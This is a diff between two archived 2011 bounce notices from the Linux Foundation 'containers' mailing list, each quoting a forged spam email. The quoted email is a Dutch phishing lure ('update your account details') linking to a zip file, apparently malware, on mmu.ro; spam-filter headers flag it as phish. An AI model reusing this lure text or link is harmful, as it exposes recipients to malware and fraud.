@@ -1,10 +1,9 @@
-From: MAILER-DAEMON-gxXIIAwuly3k4mdvcnHjz1R5wHoBV41A@public.gmane.org
-Subject: failure notice
-Date: 15 Nov 2011 17:13:06 -0000
-Message-ID: <20111115171835.6C0F63FA@mail.linuxfoundation.org>
+From: postmaster-DMvgxKAs6cU@public.gmane.org
+Subject: Delivery Status Notification (Failure)
+Date: Tue, 15 Nov 2011 19:46:46 +0100
+Message-ID: <lI6X610Co0000d06b@smtp.paard.nl>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Content-Type: multipart/mixed; boundary="===============8170750233832939604=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -18,65 +17,98 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-Hi. This is the qmail-send program at mail.argewebhosting.nl.
-I'm afraid I wasn't able to deliver your message to the following addresses.
-This is a permanent error; I've given up. Sorry it didn't work out.
+This is a MIME-formatted message.  
+Portions of this message may be unreadable without a MIME-capable mail program.
 
-<beventsnl-oHIUcid/KDjz+pZb47iToQ@public.gmane.org>:
-procmail: Extraneous filter-flag ignored
-procmail: Extraneous filter-flag ignored
-procmail: Extraneous filter-flag ignored
-procmail: Program failure (77) of "deliverquota"
+--===============8170750233832939604==
+Content-Type: multipart/report; report-type=delivery-status;
+	boundary="9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl"
 
---- Below this line is a copy of the message.
+This is a MIME-formatted message.  
+Portions of this message may be unreadable without a MIME-capable mail program.
 
-Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Received: (qmail 64111 invoked by uid 89); 15 Nov 2011 17:13:06 -0000
-Delivered-To: bianca.rikels-oHIUcid/KDjz+pZb47iToQ@public.gmane.org
-Received: (qmail 64091 invoked by uid 89); 15 Nov 2011 17:13:06 -0000
-Received: from [194.165.34.147] (HELO node6.mailshover.nl) (194.165.34.147)
-    by mx1-3.argewebhosting.nl (qpsmtpd/0.33-dev) with ESMTP; Tue, 15 Nov 2011 18:13:06 +0100
-Received: from static.99.74.4.46.clients.your-server.de ([46.4.74.99] helo=myoroclean.domain.de)
-	by node6.mailshover.nl with esmtp (Exim 4.76)
-	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
-	id 1RQMZF-0002S4-Jx; Tue, 15 Nov 2011 18:13:06 +0100
-Received: from [46.4.74.99] by myoroclean.domain.de id xV2qeCONlokF with SMTP; Tue, 15 Nov 2011 18:23:47 +0100
-Date: Tue, 15 Nov 2011 18:23:47 +0100
-From: "inform" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v3.7.18.8) Educational
+--9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
+Content-Type: text/plain; charset=unicode-1-1-utf-7
+
+This is an automatically generated Delivery Status Notification.
+
+Delivery to the following recipients failed.
+
+       glitterpaty-DMvgxKAs6cU@public.gmane.org
+
+
+
+
+--9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
+Content-Type: message/delivery-status
+
+Reporting-MTA: dns;smtp.paard.nl
+Received-From-MTA: dns;aspmail.atinet.nl
+Arrival-Date: Tue, 15 Nov 2011 19:46:45 +0100
+
+Final-Recipient: rfc822;glitterpaty-DMvgxKAs6cU@public.gmane.org
+Action: failed
+Status: 5.1.1
+
+--9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl
+Content-Type: message/rfc822
+
+Received: from aspmail.atinet.nl ([81.23.229.92]) by smtp.paard.nl with Microsoft SMTPSVC(6.0.3790.3959);
+	 Tue, 15 Nov 2011 19:46:45 +0100
+X-ASG-Debug-ID: 1321382804-5321b8d10001-FHh55d
+Received: from uspro545.startdedicated.com (uspro545.startdedicated.com [173.224.125.98]) by aspmail.atinet.nl with ESMTP id gk0xvJ2FvamGjIeu for <glitterpaty-DMvgxKAs6cU@public.gmane.org>; Tue, 15 Nov 2011 19:46:44 +0100 (CET)
+X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-Barracuda-Apparent-Source-IP: 173.224.125.98
+Received: from [173.224.125.98] by uspro545.startdedicated.com id bLb7fZx9oTe2 with SMTP; Tue, 15 Nov 2011 18:46:39 +0000
+Date: Tue, 15 Nov 2011 18:46:39 +0000
+From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.3.58.2) Educational
 X-Priority: 3 (Normal)
-Message-ID: <3977303178.37846560848666-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
-To: <a1aaa1azzzz1zaaaaa-oHIUcid/KDjz+pZb47iToQ@public.gmane.org>
-Subject: Your order has been accepted
+Message-ID: <44837728.89543159741597-QHT31ff7oBgJ6fTLyRp1Vlc0O+juaISAQQ4Iyu8u01E@public.gmane.org>
+To: <glitterpaty-DMvgxKAs6cU@public.gmane.org>
+Subject: Factuur 017539-784456
 MIME-Version: 1.0
+X-ASG-Orig-Subj: Factuur 017539-784456
 Content-Type: text/plain;
 	charset="windows-1252"
-Content-Transfer-Encoding: 8bit
-Received-SPF: fail (node6.mailshover.nl: domain of lists.linux-foundation.org does not designate 46.4.74.99 as permitted sender) client-ip=46.4.74.99; envelope-from=containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org; helo=myoroclean.domain.de;
-X-SPF-Result: node6.mailshover.nl: domain of lists.linux-foundation.org does not designate 46.4.74.99 as permitted sender
-X-SPF-Guess: Received-SPF: fail (node6.mailshover.nl: domain of lists.linux-foundation.org does not designate 46.4.74.99 as permitted sender) client-ip=46.4.74.99; envelope-from=containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org; helo=myoroclean.domain.de;
-X-SPF-Guess-Result: node6.mailshover.nl: domain of lists.linux-foundation.org does not designate 46.4.74.99 as permitted sender
-X-Filter-ID: XtLePq6GTMn8G68F0EmQvUy1TURgLZGtBlbqxVOMnQqc4b7EDSoutnKmFnlPKsIWoQfc5HpZrgOD
- EEgYVScsdtM+m4WpRRDP6YzwkAPgQJZVijYxaxtKVX1+mW0iGCONxlIrWqPYya28MrTqIi8PK7b+
- Z0WwCYVAzDc/7/hByaaX+TzrbiYpagIx3U9cXO/ga0NGmUmpH8Z9XFvpHBzyzptrS6S6BM1YN5J8
- KqA5zm90kzAeLujNhrUNIo5EFDGmSo1BHp/LHepENRp9EEs7DDYniDcn+fCVvS82KuQrS9+EPw7T
- 27N13i2g4ZX18beyEFMAmZbdgxEnSPtNjshmgUAZspnECC5Vnvv/3e1dLK6zcKkoaLWOe60dtWim
- mkoU/BSj+kcK3dIsqw7Vqd+xzPvg7iEFLP+SSY+Av5+AiC6akB5Igb7DlXKceUEyKhyLuddixABd
- VO4HHZFfDeGy2LT5xWo+mxp567435z5qeOOLBGDbAnhKT74l4Y/VloQMX2iRk71ac8rgmbDeVh/t
- EEqNV/mepIIdrzfTgroHlZtgrkYvbdSL6779OtKST6j7B8hvuxW88E8a4VI2vaEhs7CI+PIZkJpM
- ZbnbNmxhH6P1SDae4RQwdQhJVc+ds0WyFkr0LHrXb1Plkti0dvVOqIQULki5VdXZopotwa6R+VP2
- OKHH5lr9xXvSM4nM3avg
-Authentication-Results: mailshover.nl;
- spf=fail smtp.mailfrom=containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-MailShover-Class: phish
-X-MailShover-Evidence: SPF
-X-Recommended-Action: reject
+X-Barracuda-Connect: uspro545.startdedicated.com[173.224.125.98]
+X-Barracuda-Start-Time: 1321382804
+X-Barracuda-URL: http://81.23.229.92:80/cgi-mod/mark.cgi
+X-Virus-Scanned: by bsmtpd at atinet.nl
+X-Barracuda-Spam-Score: 0.85
+X-Barracuda-Spam-Status: No, SCORE=0.85 using per-user scores of TAG_LEVEL=1000.0 QUARANTINE_LEVEL=6.0 KILL_LEVEL=7.0 tests=FORGED_MUA_THEBAT_CS
+X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.80338
+	Rule breakdown below
+	 pts rule name              description
+	---- ---------------------- --------------------------------------------------
+	0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (charset)
+Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+X-OriginalArrivalTime: 15 Nov 2011 18:46:46.0021 (UTC) FILETIME=[ECE56350:01CCA3C6]
+Content-Transfer-Encoding: quoted-printable
 
 
 
 Werk uw accountgegevens.
-http://mmu.ro/clientedown/Invoice.zip?id:06036Generation_user=a1aaa1azzzz1zaaaaa-oHIUcid/KDjz+pZb47iToQ@public.gmane.org
+http://mmu.ro/clientedown/Order.zip?id:4248564549Generation_user=3Dglitte=
+rpaty-DMvgxKAs6cU@public.gmane.org
 
 ____________
-Best regards, 
+Best regards,=20
 ticket service.
+
+
+
+
+--9B095B5ADSN=_01CB53DABF9471C6000A16C5smtp.paard.nl--
+
+--===============8170750233832939604==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
+
+_______________________________________________
+Containers mailing list
+Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+https://lists.linuxfoundation.org/mailman/listinfo/containers
+--===============8170750233832939604==--
